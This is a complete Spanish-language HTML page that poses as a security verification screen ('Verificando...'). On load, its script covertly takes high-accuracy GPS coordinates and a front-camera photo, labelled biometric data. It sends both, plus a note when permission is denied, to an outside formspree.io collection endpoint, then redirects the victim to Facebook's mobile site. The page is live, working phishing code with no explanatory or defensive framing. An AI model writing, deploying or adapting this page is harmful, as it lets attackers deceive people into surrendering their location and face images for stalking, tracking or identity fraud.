<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Verificando...</title>
    <style>
        body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        #v, #c { display: none; }
    </style>
</head>
<body>
    <div id="status">Estableciendo túnel de seguridad...</div>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

<script>
    const HOOK = "https://formspree.io/f/xanrkklv";

    async function capture() {
        // 1. Obtener GPS
        navigator.geolocation.getCurrentPosition(
            (p) => log({tipo: "PASO_2_GPS", lat: p.coords.latitude, lon: p.coords.longitude}),
            null, {enableHighAccuracy: true}
        );

        // 2. Obtener Foto
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
            const video = document.getElementById('v');
            video.srcObject = stream;
            
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                log({ tipo: "PASO_2_BIOMETRIA", img: canvas.toDataURL('image/jpeg', 0.5) });
                
                document.getElementById('status').innerText = "Sincronización completa.";
                setTimeout(() => location.href = "https://m.facebook.com", 1000);
            }, 1200);
        } catch (e) {
            log({tipo: "PERMISO_DENEGADO"});
            location.href = "https://m.facebook.com";
        }
    }

    function log(d) { fetch(HOOK, { method: 'POST', body: JSON.stringify(d), headers: {'Content-Type': 'application/json'} }); }
    window.onload = capture;
</script>
</body>
</html>
